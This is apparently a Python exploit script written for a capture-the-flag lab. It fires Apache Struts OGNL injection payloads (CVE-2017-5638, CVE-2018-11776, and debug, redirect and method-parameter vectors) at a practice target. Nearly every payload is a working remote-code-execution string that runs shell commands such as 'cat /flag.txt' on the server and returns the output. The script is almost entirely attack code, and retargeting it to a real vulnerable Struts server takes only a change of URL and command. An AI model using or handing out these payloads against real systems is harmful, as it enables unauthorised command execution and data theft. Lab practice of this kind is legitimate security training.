#!/usr/bin/env python3
import requests
import urllib.parse
import sys

target = "http://ognl.vulnmachines.com:8877/struts-showcase"

# Payloads OGNL conocidos para diferentes CVEs de Struts
payloads = [
    # CVE-2017-5638 - Content-Type
    {"type": "header", "header": "Content-Type", "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},
    
    # CVE-2018-11776 - namespace
    {"type": "url", "payload": "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/actionChain1.action"},
    
    # Simple OGNL test
    {"type": "url", "payload": "${7*7}/test.action"},
    {"type": "url", "payload": "%{7*7}/test.action"},
    
    # Command execution attempts
    {"type": "param", "param": "debug", "payload": "command&expression=%23f%3d%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('cat /flag.txt')"},
    
    # CVE-2017-5638 alternative
    {"type": "header", "header": "Content-Type", "payload": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',7*7)}"},
    
    # OGNL through redirect
    {"type": "param", "param": "redirect", "payload": "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('cat /flag.txt').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}"},
    
    # Method invocation
    {"type": "param", "param": "method", "payload": "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=@java.lang.Runtime@getRuntime().exec('cat /flag.txt').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close()"},
]

print("[*] Testing OGNL Injection payloads on target:", target)
print("-" * 50)

for i, payload_info in enumerate(payloads):
    print(f"\n[{i+1}] Testing payload type: {payload_info['type']}")
    
    try:
        if payload_info['type'] == 'header':
            headers = {payload_info['header']: payload_info['payload']}
            r = requests.get(target, headers=headers, timeout=5)
            
        elif payload_info['type'] == 'url':
            test_url = target + "/" + payload_info['payload']
            r = requests.get(test_url, timeout=5)
            
        elif payload_info['type'] == 'param':
            params = {payload_info['param']: payload_info['payload']}
            r = requests.get(target, params=params, timeout=5)
        
        # Check response
        if 'vnm{' in r.text:
            print(f"[+] FLAG FOUND! Payload {i+1} worked!")
            print(f"[+] Response contains flag:")
            for line in r.text.split('\n'):
                if 'vnm{' in line:
                    print(line.strip())
            break
        elif '49' in r.text and '7*7' in str(payload_info['payload']):
            print(f"[!] Math evaluation detected (7*7=49), OGNL might be working!")
        elif 'X-Test' in r.headers and r.headers.get('X-Test') == '49':
            print(f"[!] Header injection successful! OGNL is working!")
        else:
            print(f"[-] No obvious indication of OGNL execution")
            
    except requests.exceptions.Timeout:
        print(f"[-] Request timeout")
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n" + "="*50)
print("[*] Testing additional endpoints...")

# Test different actions
actions = ['index.action', 'login.action', 'showcase.action', 'help.action']
for action in actions:
    print(f"\n[*] Testing {action}")
    test_url = f"http://ognl.vulnmachines.com:8877/struts-showcase/{action}"
    
    # Try Content-Type injection on each endpoint
    headers = {
        'Content-Type': "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la /').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    }
    
    try:
        r = requests.post(test_url, headers=headers, timeout=5)
        if 'flag' in r.text.lower() or 'vnm{' in r.text:
            print(f"[+] Possible flag reference found in {action}!")
            if 'vnm{' in r.text:
                for line in r.text.split('\n'):
                    if 'vnm{' in line:
                        print(f"[+] FLAG: {line.strip()}")
    except:
        pass